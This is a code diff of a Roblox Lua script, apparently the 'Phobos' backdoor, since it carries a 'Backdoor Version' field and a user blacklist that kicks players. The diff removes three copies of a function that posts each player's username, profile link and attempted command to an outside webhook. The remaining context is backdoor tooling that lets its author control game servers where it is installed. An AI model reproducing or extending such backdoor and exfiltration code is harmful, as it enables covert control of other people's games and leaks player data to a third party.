@@ -115,18 +115,6 @@ function Start1()
 				plr:Kick('You are not allowed to use Phobos')
 			end
 		end
-		local upload2 = function()
-			local data = {
-				["embeds"] = {{
-					["title"] = "Detected User";
-					["description"] = "\n**Username:** "..plr.Name.."\n\n**Link ** ".."https://www.roblox.com/users/"..plr.UserId.."/profile".."\n\n**Tried executing: **".."`"..lol.."`".."\n\n**Backdoor Version: **"..BDV,
-					["thumbnail"] = {url="https://cdn.discordapp.com/attachments/1016411435875713074/1020827746202554368/New_Game.png"},
-					["color"] = tonumber(0x00b3ff);
-				}}
-			}
-			local data2 = HttpService:JSONEncode(data)
-			HttpService:PostAsync(hook3,data2)
-		end
 		local success, result = pcall(function() 
 			if Other == "Respawn" then
 				local success, result = pcall(function() 
@@ -281,18 +269,6 @@ function Start2()
 			if Blacklisted == plr.UserId then
 				plr:Kick('You are not allowed to use Phobos')
 			end
-		end
-		local upload2 = function()
-			local data = {
-				["embeds"] = {{
-					["title"] = "Detected User";
-					["description"] = "\n**Username:** "..plr.Name.."\n\n**Link ** ".."https://www.roblox.com/users/"..plr.UserId.."/profile".."\n\n**Tried executing: **".."`"..lol.."`".."\n\n**Backdoor Version: **"..BDV,
-					["thumbnail"] = {url="https://cdn.discordapp.com/attachments/1016411435875713074/1020827746202554368/New_Game.png"},
-					["color"] = tonumber(0x00b3ff);
-				}}
-			}
-			local data2 = HttpService:JSONEncode(data)
-			HttpService:PostAsync(hook3,data2)
 		end
 		local success, result = pcall(function() 
 			if Other == "Respawn" then
@@ -449,18 +425,6 @@ function Start3()
 			if Blacklisted == plr.UserId then
 				plr:Kick('You are not allowed to use Phobos')
 			end
-		end
-		local upload2 = function()
-			local data = {
-				["embeds"] = {{
-					["title"] = "Detected User";
-					["description"] = "\n**Username:** "..plr.Name.."\n\n**Link ** ".."https://www.roblox.com/users/"..plr.UserId.."/profile".."\n\n**Tried executing: **".."`"..lol.."`".."\n\n**Backdoor Version: **"..BDV,
-					["thumbnail"] = {url="https://cdn.discordapp.com/attachments/1016411435875713074/1020827746202554368/New_Game.png"},
-					["color"] = tonumber(0x00b3ff);
-				}}
-			}
-			local data2 = HttpService:JSONEncode(data)
-			HttpService:PostAsync(hook3,data2)
 		end
 		local success, result = pcall(function() 
 			if Other == "Respawn" then
